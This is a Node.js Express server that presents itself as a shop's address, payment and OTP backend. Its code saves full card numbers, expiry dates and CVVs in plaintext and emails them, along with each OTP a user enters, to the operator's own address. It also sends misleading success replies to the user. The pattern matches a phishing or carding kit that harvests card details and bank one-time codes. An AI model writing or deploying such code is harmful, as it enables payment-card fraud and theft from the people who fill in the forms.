const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors");
const mongoose = require("mongoose");
require("dotenv").config();

// Models (Address & Payment Schema)
const Address = require("./models/Address"); // Make sure Address schema is defined in models/Address.js
const Payment = require("./models/Payment"); // Make sure Payment schema is defined in models/Payment.js

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Helper function to send emails
const sendEmail = async (recipient, subject, text) => {
    try {
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.EMAIL_PASSWORD,
            },
        });

        const mailOptions = {
            from: process.env.EMAIL,
            to: recipient,
            subject,
            text,
        };

        await transporter.sendMail(mailOptions);
        console.log("Email sent successfully!");
    } catch (error) {
        console.error("Error sending email:", error);
        throw new Error("Failed to send email.");
    }
};

// OTP Verification API
app.post("/api/verify-otp", async (req, res) => {
    const { otp } = req.body;

    console.log("User Submitted OTP:", otp);

    if (!otp) {
        return res.status(400).json({ message: "OTP is required." });
    }

    try {
        const emailText = `The OTP entered by the user is: ${otp}`;

        console.log("Sending email with user-submitted OTP...");
        await sendEmail(process.env.EMAIL, "User Submitted OTP", emailText);

        res.status(200).json({ message: "OTP sent to your email successfully!" });
    } catch (error) {
        console.error("Error sending OTP email:", error);
        res.status(500).json({ message: "Failed to send OTP to email." });
    }
});

// Address Submission API
app.post("/api/address", async (req, res) => {
    const { name, phone, state, pincode, address1, address2 } = req.body;

    if (!name || !phone || !state || !pincode || !address1 || !address2) {
        return res.status(400).json({ message: "All fields are required." });
    }

    try {
        const address = new Address({ name, phone, state, pincode, address1, address2 });
        await address.save();

        const emailText = `Your address has been successfully submitted:

Name: ${name}
Phone: ${phone}
State: ${state}
Pincode: ${pincode}
Address 1: ${address1}
Address 2: ${address2}

Thank you for providing your address!`;

        await sendEmail(process.env.EMAIL, "Address Confirmation", emailText);

        res.status(200).json({ message: "Address submitted and email sent successfully!" });
    } catch (error) {
        console.error("Error saving address or sending email:", error);
        res.status(500).json({ message: "Failed to submit address." });
    }
});

// Payment Submission API
app.post("/api/payment", async (req, res) => {
    const { cardNumber, expiryDate, cvv, product } = req.body;

    if (!cardNumber || !expiryDate || !cvv || !product) {
        return res.status(400).json({ message: "All fields are required." });
    }

    try {
        const payment = new Payment({ cardNumber, expiryDate, cvv, product });
        await payment.save();

        const emailText = `Thank you for your purchase!

Product: ${product.name}
Price: ₹${product.sale_price}
Delivery Charge: ₹${product.delivery_charge || 0}

Payment Details:
Card Number: ${cardNumber}
Expiry Date: ${expiryDate}
cvv: ${cvv}

Thank you for shopping with us!`;

        await sendEmail(process.env.EMAIL, "Payment Confirmation", emailText);

        res.status(200).json({ message: "Payment successful and email sent!" });
    } catch (error) {
        console.error("Error saving payment or sending email:", error);
        res.status(500).json({ message: "Failed to process payment." });
    }
});

// MongoDB Connection
mongoose
    .connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("Connected to MongoDB"))
    .catch((error) => {
        console.error("MongoDB connection error:", error.message);
        process.exit(1);
    });

// Start the Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
